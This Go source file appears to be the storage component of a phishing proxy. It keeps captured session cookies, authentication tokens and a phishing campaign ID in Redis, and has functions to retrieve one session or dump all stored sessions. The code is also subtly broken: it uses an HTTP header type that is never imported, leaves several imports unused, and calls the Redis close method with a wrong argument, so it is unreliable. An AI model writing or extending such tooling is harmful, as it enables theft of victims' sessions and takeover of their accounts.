package main  // For proxy dir

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/go-redis/redis/v8"
)

type Session struct {
	ID       string                 `json:"id"`
	Cookies  http.Header            `json:"cookies"`
	Tokens   map[string]string      `json:"tokens"`
	PhishID  string                 `json:"phish_id"`
	Created  time.Time              `json:"created"`
}

type Storage struct {
	rdb *redis.Client
	ctx context.Context
}

func NewStorage(redisURL string) (*Storage, error) {
	opt, err := redis.ParseURL(redisURL)
	if err != nil {
		return nil, fmt.Errorf("parse URL: %v", err)
	}
	rdb := redis.NewClient(opt)
	ctx := context.Background()
	if err := rdb.Ping(ctx).Err(); err != nil {
		return nil, fmt.Errorf("ping failed: %v", err)
	}
	return &Storage{rdb: rdb, ctx: ctx}, nil
}

func (s *Storage) SetSession(sess *Session) error {
	data, err := json.Marshal(sess)
	if err != nil {
		return fmt.Errorf("marshal: %v", err)
	}
	key := sess.ID
	if err := s.rdb.Set(s.ctx, key, data, 1*time.Hour).Err(); err != nil {
		return fmt.Errorf("set %s: %v", key, err)
	}
	return nil
}

func (s *Storage) GetSession(id string) (*Session, error) {
	data, err := s.rdb.Get(s.ctx, id).Result()
	if err == redis.Nil {
		return nil, fmt.Errorf("session %s not found", id)
	}
	if err != nil {
		return nil, fmt.Errorf("get %s: %v", id, err)
	}
	var sess Session
	if err := json.Unmarshal([]byte(data), &sess); err != nil {
		return nil, fmt.Errorf("unmarshal: %v", err)
	}
	return &sess, nil
}

func (s *Storage) DumpAllSessions() ([]Session, error) {
	iter := s.rdb.Scan(s.ctx, 0, "*", 0).Iterator()
	var sessions []Session
	for iter.Next(s.ctx) {
		key := iter.Val()
		data, err := s.rdb.Get(s.ctx, key).Result()
		if err != nil {
			continue
		}
		var sess Session
		if json.Unmarshal([]byte(data), &sess) == nil {
			sessions = append(sessions, sess)
		}
	}
	if err := iter.Err(); err != nil {
		return nil, fmt.Errorf("scan: %v", err)
	}
	return sessions, nil
}

func (s *Storage) DumpSession(id string) (*Session, error) {
	return s.GetSession(id)
}

func (s *Storage) Close() {
	s.rdb.Close(s.ctx)
}
